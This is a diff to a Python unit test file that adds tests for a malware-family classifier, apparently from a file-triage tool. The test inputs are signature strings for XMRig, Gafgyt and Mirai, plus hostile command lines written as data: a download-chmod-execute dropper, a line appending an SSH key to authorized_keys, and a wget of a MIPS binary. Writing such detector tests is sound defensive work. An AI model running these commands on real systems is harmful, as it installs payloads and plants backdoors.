@@ -66,6 +66,14 @@ class FileInfo(unittest.TestCase):
         self.assertEqual(fileinfo.classify(b"#!/bin/sh\nwget x\n")[0], "script (/bin/sh)")
         self.assertEqual(fileinfo.classify(b"\x1f\x8b\x08")[0], "gzip")
 
+    def test_families(self):
+        self.assertEqual(fileinfo.family(b"\x7fELF....xmrig....donate-level"), "XMRig (Monero miner)")
+        self.assertEqual(fileinfo.family(b"\x7fELF..GETLOCALIP..HOLD"), "Gafgyt / Bashlite")
+        self.assertEqual(fileinfo.family(b"\x7fELF../dev/watchdog..TSource Engine Query"), "Mirai")
+        self.assertEqual(fileinfo.family(b"#!/bin/sh\ncd /tmp; wget http://x/a; chmod 777 a; ./a"), "Dropper script")
+        self.assertEqual(fileinfo.family(b"echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys"), "SSH key backdoor")
+        self.assertEqual(fileinfo.family(b"nothing interesting here"), "")
+
     def test_iocs(self):
         out = fileinfo.iocs(b"wget http://8.8.4.4/bins/mips; 10.0.0.1 1.2.3.4:4444 http://example.com/a.sh.")
         self.assertIn("http://8.8.4.4/bins/mips", out)
